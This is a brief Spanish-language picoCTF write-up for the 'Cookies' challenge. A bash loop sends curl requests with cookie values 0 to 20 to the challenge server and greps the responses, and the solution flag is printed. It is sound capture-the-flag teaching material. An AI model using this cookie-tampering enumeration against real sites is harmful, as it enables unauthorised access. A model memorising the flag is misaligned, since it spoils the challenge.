### Cookies

### Descripción

Who doesn't love cookies? Try to figure out the best one.http://wily-courier.picoctf.net:50079/
### Solución

### Solucion 1 usando Consola de Kali Linux

```

┌──(JorgeMSI㉿MSI)-[~]
└─$ for i in {0..20}; do curl -s http://wily-courier.picoctf.net:50079/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}

```


### Referencias
- https://www.youtube.com/watch?v=LseQ-XWCXVo&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=13